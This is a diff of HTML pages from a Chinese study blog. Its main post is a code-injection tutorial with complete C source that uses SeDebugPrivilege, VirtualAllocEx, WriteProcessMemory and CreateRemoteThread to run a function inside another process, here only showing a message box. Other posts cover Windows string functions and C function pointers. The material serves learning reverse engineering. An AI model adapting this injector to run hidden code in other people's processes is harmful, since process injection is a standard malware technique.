+<p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1649813766466.png" alt="默认版本"></p>
+<h2 id="C运行库中的Unicode函数和ANSI函数"><a href="#C运行库中的Unicode函数和ANSI函数" class="headerlink" title="C运行库中的Unicode函数和ANSI函数"></a>C运行库中的Unicode函数和ANSI函数</h2><p>和Windows函数一样，C运行库提供了一系列函数处理ANSI字符和字符串，并提供了一系列函数来处理Unicode字符与字符串</p>
+<p>在C运行库中，strlen就是一个能返回ANSI字符串长度的函数。与之对应的是wcslen，这个C运行库函数能返回Unicode字符串的长度，这两个函数都在string.h中</p>
+<h2 id="C运行库中的安全字符串函数"><a href="#C运行库中的安全字符串函数" class="headerlink" title="C运行库中的安全字符串函数"></a>C运行库中的安全字符串函数</h2><blockquote>
+<p><strong>任何修改字符串的函数都存在一个安全隐患：如果目标字符串缓冲区不够大，无法容纳所生成的字符串，就会导致内存中的数据被破坏</strong></p>
+</blockquote>
+<p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650011578747.png" alt="例子"></p>
+<p>为了防止被被恶意软件肆意滥用，微软提供了一系列新的函数来取代C运行库的不安全的字符串处理函数</p>
+<p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650011917625.png"></p>
+<p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012022950.png"></p>
+<p>书中没有详细介绍，可以自行查找</p>
+<p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012306710.png" alt="安全字符串函数"></p>
+<p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012361902.png" alt="安全字符串函数执行"></p>
+<h1 id="Windows字符串函数"><a href="#Windows字符串函数" class="headerlink" title="Windows字符串函数"></a>Windows字符串函数</h1><p>不知道讲了些啥</p>
+<h2 id="为何要用Unicode"><a href="#为何要用Unicode" class="headerlink" title="为何要用Unicode"></a>为何要用Unicode</h2><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012784209.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://gift1a.github.io/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Gift1a">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">代码注入</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-04-12 11:41:45" itemprop="dateCreated datePublished" datetime="2022-04-12T11:41:45+08:00">2022-04-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-04-14 22:07:08" itemprop="dateModified" datetime="2022-04-14T22:07:08+08:00">2022-04-14</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00-前言"></a>0x00-前言</h1><p>感觉《逆向工程核心原理》只是进行了一点介绍，但是我理解能力有限</p>
+<p>于是翻阅到了这篇文章</p>
+<p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1270499-1-1.html">https://www.52pojie.cn/thread-1270499-1-1.html</a></p>
+<h1 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01-原理"></a>0x01-原理</h1><p>在DLL注入中，我们通过远程线程在目标进程中调用LoadLibraryA()函数加载我们的DLL</p>
+<p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649738932188.png"></p>
+<p>实际上只要我们定义的函数符合CreateRemoteThread参数中定义的函数模板，就可以通过远程线程的方式去执行它，而不限于LoadLibraryA</p>
+<pre class="language-c" data-language="c"><code class="language-c">DWORD WINAPI ThreadProc(
+  _In_ LPVOID lpParameter
+);</code></pre>
+
+<p>所以我们只要定义一个只有一个参数的函数，把它转换成 LPTHREAD_START_ROUTINE（CreateRemoteThread的参数）即可。</p>
+<p>但是这里产生了一个问题，如果我们的函数具有多个参数怎么办呢，要成功调用函数的话，我们的参数也需要在目标进程的虚拟内存中</p>
+<blockquote>
+<p>对于将我们的参数写入虚拟内存中，我们可以使用VirtualAllocEx函数向目标申请内存虚拟空间</p>
+<p>对于多个参数，我们可以构建一个结构体存放所有的参数，然后在调用的时候通过内存偏移来访问参数</p>
+</blockquote>
+<pre class="language-c" data-language="c"><code class="language-c">typedef struct _INJECT_DATA
+{
+    char lpText[8];  //参数1
+    char lpCaption[8];  //参数2
+}INJECT_DATA;</code></pre>
+
+<p>下面以MessageBoxA函数为例</p>
+<h2 id="定义函数指针"><a href="#定义函数指针" class="headerlink" title="定义函数指针"></a>定义函数指针</h2><p>首先先进行定义我们要使用到的函数指针</p>
+<p>因为我们要调用user32.dll中的MessageBoxA，所以要使用LoadLibraryA()加载user32.dll，并且使用GetProcAddress()获取MessageBoxA的函数地址</p>
+<pre class="language-c" data-language="c"><code class="language-c">//定义函数指针，方便调用HOMDULE是返回值，WINAPI也就是__stdcall，是调用约定，类型名为PFLOADLIBRARYA，lpLivFileName是参数
+typedef HMODULE(WINAPI *PFLOADLIBRARYA)(LPCSTR lpLibFileName);//前面的是返回值，中间是类型
+
+typedef FARPROC(WINAPI *PFGETPROCADDRESS)(HMODULE hModule,LPCSTR lpProcName);//返回值是一个回调函数
+
+typedef int (WINAPI *PFMESSAGEBOXA)(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType);</code></pre>
+
+<h2 id="定义线程信息块"><a href="#定义线程信息块" class="headerlink" title="定义线程信息块"></a>定义线程信息块</h2><p>使用结构体存储我们要调用的函数信息</p>
+<pre class="language-c" data-language="c"><code class="language-c">//创建一个存储线程信息的结构体
+typedef struct _THREAD_PARAM//定义线程信息
+{
+    FARPROC pFunc[2];               // LoadLibraryA(), GetProcAddress()  
+    char    szBuf[4][128];          // "user32.dll", "MessageBoxA", "Inject Success!!", "Hint"  
+} THREAD_PARAM, * PTHREAD_PARAM;//分别是线程信息块和指向线程信息的指针
+</code></pre>
+
+<h2 id="线程信息块赋值"><a href="#线程信息块赋值" class="headerlink" title="线程信息块赋值"></a>线程信息块赋值</h2><pre class="language-c" data-language="c"><code class="language-c">hMod = GetModuleHandleA("kernel32.dll");
+
+//先给线程信息块赋值 
+param.pFunc[0] = GetProcAddress(hMod, "LoadLibraryA");
+param.pFunc[1] = GetProcAddress(hMod, "GetProcAddress");//因为kernel32在内存中优先被装载，所以在不同进程中都一样
+strcpy_s(param.szBuf[0], "user32.dll");
+strcpy_s(param.szBuf[1], "MessageBoxA");
+strcpy_s(param.szBuf[2], "InjectCode Success!!");
+strcpy_s(param.szBuf[3], "Hint");</code></pre>
+
+<h2 id="打开目标进程"><a href="#打开目标进程" class="headerlink" title="打开目标进程"></a>打开目标进程</h2><pre class="language-c" data-language="c"><code class="language-c">//开启进程  
+    if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwPID)))              
+    {
+        printf("OpenProcess() fail : err_code = %d\n", GetLastError());
+        return FALSE;
+    }</code></pre>
+
+<h2 id="开辟内存并写入线程信息"><a href="#开辟内存并写入线程信息" class="headerlink" title="开辟内存并写入线程信息"></a>开辟内存并写入线程信息</h2><p>第一次写入的是线程函数要调用的函数信息</p>
+<pre class="language-c" data-language="c"><code class="language-c">//为注入的线程信息块中的第一个函数开辟内存 
+    dwSize = sizeof(THREAD_PARAM);
+    if (!(pRemoteBuf[0] = VirtualAllocEx(hProcess,NULL,dwSize,MEM_COMMIT,PAGE_READWRITE)))    
+    {
+        printf("VirtualAllocEx() fail : err_code = %d\n", GetLastError());
+        return FALSE;
+    }
+    //写入线程信息块中函数的值和参数到进程中
+    if (!WriteProcessMemory(hProcess,pRemoteBuf[0],(LPVOID)&amp;param,dwSize,NULL))
+    {
+        printf("WriteProcessMemory() fail : err_code = %d\n", GetLastError());
+        return FALSE;
+    }</code></pre>
+
+<p>第二次将线程函数写入内存</p>
+<pre class="language-c" data-language="c"><code class="language-c">//再次开辟  
+    dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;
+    if (!(pRemoteBuf[1] = VirtualAllocEx(hProcess,NULL,dwSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE)))
+    {
+        printf("VirtualAllocEx() fail : err_code = %d\n", GetLastError());
+        return FALSE;
     }
 
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
+    //函数调用
+    if (!WriteProcessMemory(hProcess,pRemoteBuf[1],(LPVOID)ThreadProc,dwSize,NULL))
+    {
+        printf("WriteProcessMemory() fail : err_code = %d\n", GetLastError());
+        return FALSE;
+    }</code></pre>
+
+<h2 id="开启远程线程"><a href="#开启远程线程" class="headerlink" title="开启远程线程"></a>开启远程线程</h2><p>在目标线程中开启远程线程</p>
+<pre class="language-c" data-language="c"><code class="language-c">if (!(hThread = CreateRemoteThread(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)pRemoteBuf[1],pRemoteBuf[0],0,NULL)))
+    {
+        printf("CreateRemoteThread() fail : err_code = %d\n", GetLastError());
+        return FALSE;
+    }</code></pre>
+
+<h2 id="线程函数实现调用"><a href="#线程函数实现调用" class="headerlink" title="线程函数实现调用"></a>线程函数实现调用</h2><p>开启线程后会调用线程函数，把我们写入进程内存中的信息读取到要调用的函数中，最后实现调用</p>
+<pre class="language-c" data-language="c"><code class="language-c">//这里的WINAPI是调用约定，相当于__stdcall
+//线程函数，线程开始的地方
+DWORD WINAPI ThreadProc(LPVOID lParam)
+{
+    PTHREAD_PARAM   pParam = (PTHREAD_PARAM)lParam;
+    HMODULE         hMod = NULL;
+    FARPROC         pFunc = NULL;
+
+    // LoadLibrary()，将pFunc[0]强制转换为这样类型的函数指针，pParam-&gt;szBuf[0]是该函数的参数
+    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[0])(pParam-&gt;szBuf[0]);    // "user32.dll"，第二个括号内的是函数的参数
+    if (!hMod)
+        return 1;
+
+    // GetProcAddress()，返回值是回调函数，pFunc就是函数指针
+    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[1])(hMod, pParam-&gt;szBuf[1]);  // "MessageBoxA" ，获取到MessageBoxA的地址 
+    if (!pFunc)
+        return 1;
+
+    // MessageBoxA()  
+    ((PFMESSAGEBOXA)pFunc)(NULL, pParam-&gt;szBuf[2], pParam-&gt;szBuf[3], MB_OK);//最后的调用
+
+    return 0;
+}</code></pre>
+
+<h1 id="0x02-代码实现"><a href="#0x02-代码实现" class="headerlink" title="0x02-代码实现"></a>0x02-代码实现</h1><pre class="language-c" data-language="c"><code class="language-c">#include&lt;string.h&gt;
+#include "windows.h"  
+#include "stdio.h" 
+
+//创建一个存储线程信息的结构体
+typedef struct _THREAD_PARAM//定义线程信息
+{
+    FARPROC pFunc[2];               // LoadLibraryA(), GetProcAddress()  
+    char    szBuf[4][128];          // "user32.dll", "MessageBoxA", "www.reversecore.com", "ReverseCore"  
+} THREAD_PARAM, * PTHREAD_PARAM;//分别是线程信息块和指向线程信息的指针
+
+//定义函数指针，方便调用HOMDULE是返回值，WINAPI也就是__stdcall，是调用约定，类型名为PFLOADLIBRARYA，lpLivFileName是参数
+typedef HMODULE(WINAPI *PFLOADLIBRARYA)(LPCSTR lpLibFileName);//前面的是返回值，中间是类型
+
+typedef FARPROC(WINAPI *PFGETPROCADDRESS)(HMODULE hModule,LPCSTR lpProcName);//返回值是一个回调函数
+
+typedef int (WINAPI *PFMESSAGEBOXA)(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType);
+
+//这里的WINAPI是调用约定，相当于__stdcall
+//线程函数，线程开始的地方
+DWORD WINAPI ThreadProc(LPVOID lParam)
+{
+    PTHREAD_PARAM   pParam = (PTHREAD_PARAM)lParam;
+    HMODULE         hMod = NULL;
+    FARPROC         pFunc = NULL;
+
+    // LoadLibrary()，将pFunc[0]强制转换为这样类型的函数指针，pParam-&gt;szBuf[0]是该函数的参数
+    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[0])(pParam-&gt;szBuf[0]);    // "user32.dll"，第二个括号内的是函数的参数
+    if (!hMod)
+        return 1;
+
+    // GetProcAddress()，返回值是回调函数，pFunc就是函数指针
+    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[1])(hMod, pParam-&gt;szBuf[1]);  // "MessageBoxA" ，获取到MessageBoxA的地址 
+    if (!pFunc)
+        return 1;
+
+    // MessageBoxA()  
+    ((PFMESSAGEBOXA)pFunc)(NULL, pParam-&gt;szBuf[2], pParam-&gt;szBuf[3], MB_OK);//最后的调用
+
+    return 0;
+}
+
+BOOL InjectCode(DWORD dwPID)
+{
+    HMODULE         hMod = NULL;
+    THREAD_PARAM    param = { 0, };
+    HANDLE          hProcess = NULL;
+    HANDLE          hThread = NULL;
+    LPVOID          pRemoteBuf[2] = { 0, };
+    DWORD           dwSize = 0;
+
+    hMod = GetModuleHandleA("kernel32.dll");
+
+    //先给线程信息块赋值 
+    param.pFunc[0] = GetProcAddress(hMod, "LoadLibraryA");
+    param.pFunc[1] = GetProcAddress(hMod, "GetProcAddress");//因为kernel32在内存中优先被装载，所以在不同进程中都一样
+    strcpy_s(param.szBuf[0], "user32.dll");
+    strcpy_s(param.szBuf[1], "MessageBoxA");
+    strcpy_s(param.szBuf[2], "InjectCode Success!!");
+    strcpy_s(param.szBuf[3], "Hint");
+
+    //开启进程  
+    if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwPID)))              
+    {
+        printf("OpenProcess() fail : err_code = %d\n", GetLastError());
+        return FALSE;
     }
 
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
+    //为注入的线程信息块中的第一个函数开辟内存 
+    dwSize = sizeof(THREAD_PARAM);
+    if (!(pRemoteBuf[0] = VirtualAllocEx(hProcess,NULL,dwSize,MEM_COMMIT,PAGE_READWRITE)))    
+    {
+        printf("VirtualAllocEx() fail : err_code = %d\n", GetLastError());
+        return FALSE;
+    }
+    //写入线程信息块中函数的值和参数到进程中
+    if (!WriteProcessMemory(hProcess,pRemoteBuf[0],(LPVOID)&amp;param,dwSize,NULL))
+    {
+        printf("WriteProcessMemory() fail : err_code = %d\n", GetLastError());
+        return FALSE;
     }
 
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
+    //再次开辟  
+    dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;
+    if (!(pRemoteBuf[1] = VirtualAllocEx(hProcess,NULL,dwSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE)))
+    {
+        printf("VirtualAllocEx() fail : err_code = %d\n", GetLastError());
+        return FALSE;
     }
 
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
+    //函数调用
+    if (!WriteProcessMemory(hProcess,pRemoteBuf[1],(LPVOID)ThreadProc,dwSize,NULL))
+    {
+        printf("WriteProcessMemory() fail : err_code = %d\n", GetLastError());
+        return FALSE;
+    }
+    //开启远程线程，LPTHREAD_START_ROUTINE指向一个回调函数，pRemoteBuf[1]是函数，pRemoteBufe[0]是函数的值和参数
+    if (!(hThread = CreateRemoteThread(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)pRemoteBuf[1],pRemoteBuf[0],0,NULL)))
+    {
+        printf("CreateRemoteThread() fail : err_code = %d\n", GetLastError());
+        return FALSE;
+    }
+
+    WaitForSingleObject(hThread, INFINITE);
+
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+
+    return TRUE;
+}
+
+BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
+{
+    TOKEN_PRIVILEGES tp;
+    HANDLE hToken;
+    LUID luid;
+
+    if (!OpenProcessToken(GetCurrentProcess(),
+        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+        &amp;hToken))
+    {
+        printf("OpenProcessToken error: %u\n", GetLastError());
+        return FALSE;
+    }
+
+    if (!LookupPrivilegeValue(NULL,           // lookup privilege on local system  
+        lpszPrivilege,  // privilege to lookup   
+        &amp;luid))        // receives LUID of privilege  
+    {
+        printf("LookupPrivilegeValue error: %u\n", GetLastError());
+        return FALSE;
+    }
+
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    if (bEnablePrivilege)
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    else
+        tp.Privileges[0].Attributes = 0;
+
+    // Enable the privilege or disable all privileges.  
+    if (!AdjustTokenPrivileges(hToken,
+        FALSE,
+        &amp;tp,
+        sizeof(TOKEN_PRIVILEGES),
+        (PTOKEN_PRIVILEGES)NULL,
+        (PDWORD)NULL))
+    {
+        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
+        return FALSE;
+    }
+
+    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
+    {
+        printf("The token does not have the specified privilege. \n");
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+int main(int argc, char* argv[])
+{
+    DWORD dwPID = 0;
+
+    if (argc != 2)
+    {
+        printf("\n USAGE  : %s &lt;pid&gt;\n", argv[0]);
+        return 1;
+    }
+
+    //进程提权
+    if (!SetPrivilege(SE_DEBUG_NAME, TRUE))
+        return 1;
+
+    //code injection  
+    dwPID = (DWORD)atol(argv[1]);
+    dwPID = 9432;
+    InjectCode(dwPID);
+
+    return 0;
+}</code></pre>
+
+<h1 id="0x03-最终效果"><a href="#0x03-最终效果" class="headerlink" title="0x03-最终效果"></a>0x03-最终效果</h1><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649916449939.png"></p>
+<h1 id="0x04-代码注入调试练习"><a href="#0x04-代码注入调试练习" class="headerlink" title="0x04-代码注入调试练习"></a>0x04-代码注入调试练习</h1><p>先使用OD打开notepad++，并F9直至notepad++处于运行状态</p>
+<p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922555004.png" alt="进行设置"></p>
+<p>然后查看notepad++ PID并注入</p>
+<p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922580481.png"></p>
+<p>注入之后会断在ThreadProc函数</p>
+<p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922621425.png"></p>
+<p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922671867.png"></p>
+<p>在x32中</p>
+<p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649923028194.png"></p>
+
+      
     </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
 </div>
 
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="/libs/aplayer/Meting.min.js"></script>
+
+
 
     
 
-    <div class="container row center-align"
-         style="margin-bottom: 15px !important;">
-        <div class="col s12 m8 l8 copy-right">
-            Copyright&nbsp;&copy;
-            
-                <span id="year">2021-2022</span>
-            
-            <a href="/about" target="_blank">Gift1a</a>
-            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
-            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
-            <br>
-            
-                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">82.2k</span>
-            
-            
-            
-                
-            
-            
-                <span id="busuanzi_container_site_pv">
-                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
-                    <span id="busuanzi_value_site_pv" class="white-color"></span>
-            </span>
-            
-            
-                <span id="busuanzi_container_site_uv">
-                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
-                    <span id="busuanzi_value_site_uv" class="white-color"></span>
-            </span>
-            
-            <br>
 
-            <!-- 运行天数提醒. -->
-            
-                <span id="sitetime"> Loading ...</span>
-                <script>
-                    var calcSiteTime = function () {
-                        var seconds = 1000;
-                        var minutes = seconds * 60;
-                        var hours = minutes * 60;
-                        var days = hours * 24;
-                        var years = days * 365;
-                        var today = new Date();
-                        var startYear = "2021";
-                        var startMonth = "12";
-                        var startDate = "27";
-                        var startHour = "0";
-                        var startMinute = "0";
-                        var startSecond = "0";
-                        var todayYear = today.getFullYear();
-                        var todayMonth = today.getMonth() + 1;
-                        var todayDate = today.getDate();
-                        var todayHour = today.getHours();
-                        var todayMinute = today.getMinutes();
-                        var todaySecond = today.getSeconds();
-                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
-                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
-                        var diff = t2 - t1;
-                        var diffYears = Math.floor(diff / years);
-                        var diffDays = Math.floor((diff / days) - diffYears * 365);
+<div class="post-block">
+  
+  
 
-                        // 区分是否有年份.
-                        var language = 'zh-CN';
-                        if (startYear === String(todayYear)) {
-                            document.getElementById("year").innerHTML = todayYear;
-                            var daysTip = 'This site has been running for ' + diffDays + ' days';
-                            if (language === 'zh-CN') {
-                                daysTip = '本站已运行 ' + diffDays + ' 天';
-                            } else if (language === 'zh-HK') {
-                                daysTip = '本站已運行 ' + diffDays + ' 天';
-                            }
-                            document.getElementById("sitetime").innerHTML = daysTip;
-                        } else {
-                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
-                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
-                                + diffDays + ' days';
-                            if (language === 'zh-CN') {
-                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
-                            } else if (language === 'zh-HK') {
-                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
-                            }
-                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
-                        }
-                    }
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://gift1a.github.io/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/">
 
-                    calcSiteTime();
-                </script>
-            
-            <br>
-            
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Gift1a">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/" class="post-title-link" itemprop="url">基础知识补充</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-04-11 15:59:14" itemprop="dateCreated datePublished" datetime="2022-04-11T15:59:14+08:00">2022-04-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-04-15 16:13:55" itemprop="dateModified" datetime="2022-04-15T16:13:55+08:00">2022-04-15</time>
+    </span>
+
+  
+</div>
+
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/Gift1a/Gift1a.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
-        <i class="fab fa-github"></i>
-    </a>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="0x00-typedef定义函数指针"><a href="#0x00-typedef定义函数指针" class="headerlink" title="0x00-typedef定义函数指针"></a>0x00-typedef定义函数指针</h1><h2 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h2><p>在此之前我们要先了解函数指针，即存放函数首地址的变量，而函数名就是函数的首地址，为了存放函数的首地址就需要定义函数指针</p>
+<pre class="language-c" data-language="c"><code class="language-c">void hello()
+{
+	printf("this is hello!");
+}
+//函数指针定义
+void (*fp)()=hello;//函数指针定义时应保证函数返回值与参数个数、类型相同，在这里void是返回类型，(*fp)后面的()是函数参数
+/*也可以理解为
+void (*fp)();
+fp=hello;
+*/
+
+//通过函数指针调用函数
+fp();
+
+int add(int a,int b)
+{
+    return a+b;
+}
+
+//函数指针定义,形参可以不写变量名
+int (*fp1)(int,int)=add;
+//函数调用
+fp1(1,2);</code></pre>
+
+<h2 id="typedef与函数指针混合使用"><a href="#typedef与函数指针混合使用" class="headerlink" title="typedef与函数指针混合使用"></a>typedef与函数指针混合使用</h2><pre class="language-c" data-language="c"><code class="language-c">typedef int (*FP)(int,int);</code></pre>
+
+<p>那么我们在赋值的时候就可以改成</p>
+<pre class="language-c" data-language="c"><code class="language-c">FP fp1=add;//fp1就是返回值为int型，参数为两个int型的函数指针，FP表示函数指针的类型，通过类型名+变量名就可以定义函数指针
+fp1(1,2);</code></pre>
+
+<h1 id="0x01-回调函数"><a href="#0x01-回调函数" class="headerlink" title="0x01-回调函数"></a>0x01-回调函数</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>如果函数的参数具有函数指针，那么这样的函数就被称为回调函数</p>
+<p>函数指针就是当作接口使用的</p>
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="language-c" data-language="c"><code class="language-c">//这里的call就是回调函数,这里传递函数指针和我们传入数组时使用函数指针是类似的，都是使用指针将首地址进行传递，而不是传整个函数
+void call(void(*fp)())
+{
+    fp();//这样调用的时候就不需要考虑函数指针的变量名，只要传递的函数是这样类型的即可在call函数中进行调用
+    return ;
+}
+//当然也可以使用typedef，让回调函数更简洁
+typedef void (*fp)();
+void call(fp)
+{
+    fp();
+    return ;
+}
+void hello()
+{
+    printf("hello");
+}
+void show()
+{
+    printf("show");
+}
+//如果不使用回调函数，调用时需要hello();show();
+int main()
+{
+    call(show);
+    call(hello);//使用回调函数调用，这样只需要传入不同参数即可完成调用
+    return 0;
+}</code></pre>
+
+<h1 id="0x02-复杂函数"><a href="#0x02-复杂函数" class="headerlink" title="0x02-复杂函数"></a>0x02-复杂函数</h1><p>定义复杂的回调函数</p>
+<pre class="language-c" data-language="c"><code class="language-c">void *handle(void*arg)
+{
+    printf("arg is %X\n",arg);
+    return arg;//返回值是void*
+}
+
+//我们要定义一个参数为函数指针，返回值为函数指针的回调函数
+//先来看参数，传入函数指针void* (*fp)(void *),另一个还要传入的是arg，这里定义为void*p
+//然后再定义一个以上面两个参数为函数参数，返回值是函数指针(这里是handle函数指针)的函数
+void *(*call(void *(fp)(void*),void*p))(void *)//在这里call是回调函数的变量名，void*是返回值，最后的(void*)是返回的函数指针的参数，call()里的两个是回调函数的参数
+{
+    fp(p);
+    return fp;
+}
+int main()
+{
+    int num=10;
+    void*(*fp)(void*)=call(handle,&amp;num);//使用对应类型的函数指针接收
+    return 0;
+}
+
+//为了方便理解，使用typedef
+typedef void*(*FP)(void*);
+FP call(FP fp1,void*p)
+{
+    fp1(p);
+    return fp;
+}</code></pre>
+
+<h1 id="0x03-一维数组内存"><a href="#0x03-一维数组内存" class="headerlink" title="0x03-一维数组内存"></a>0x03-一维数组内存</h1><pre class="language-c" data-language="c"><code class="language-c">int arr[6]={10,20,30,40};//当有初始值时，剩余没定义的默认为0，如果没有定义初始值，则为随机值</code></pre>
+
+<p>因为数组长度定义为6，类型为int，所以在内存中分配24个字节</p>
